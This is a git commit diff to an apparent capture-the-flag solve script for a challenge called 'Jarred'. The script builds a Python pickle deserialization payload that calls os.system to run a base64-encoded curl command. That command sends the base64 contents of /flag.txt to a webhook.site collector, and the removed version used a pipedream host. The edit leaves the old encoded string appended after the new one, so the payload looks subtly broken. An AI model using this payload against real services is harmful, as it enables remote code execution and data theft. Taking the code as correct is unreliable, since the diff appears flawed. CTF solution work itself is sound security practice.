4367ac3fd26f4da455da68a83187c24e6d662dbd
0x-Matthias <138510020+0x-Matthias@users.noreply.github.com>
2025-02-28 11:55:58 +0100

    Modified the solve script for web/jarred to be able to set the callback_url manually.

--- web/Jarred/solution/solution.py
+++ web/Jarred/solution/solution.py
@@ -1,8 +1,11 @@
-import base64
+from base64 import b64encode
+
+callback_url = 'https://webhook.site/249ea1e3-d94a-45e3-9a9f-ae3f005a68bb'
+payload1 = b64encode(('curl ' + callback_url + '/?q=$(cat${IFS}/flag.txt|base64)').encode())
 
 payload = b"""(cos
 system
-S'echo Y3VybCBodHRwczovL2VvZ2NlOHRndWpmZ2s1Zi5tLnBpcGVkcmVhbS5uZXQvP3E9JChjYXQke0lGU30vZmxhZy50eHR8YmFzZTY0KQ==|base64 -d|bash'
+S'echo """ + payload1 + b"""Y3VybCBodHRwczovL2VvZ2NlOHRndWpmZ2s1Zi5tLnBpcGVkcmVhbS5uZXQvP3E9JChjYXQke0lGU30vZmxhZy50eHR8YmFzZTY0KQ==|base64 -d|bash'
 o"""
-ab = base64.b64encode(payload)
+ab = b64encode(payload)
 print(ab)
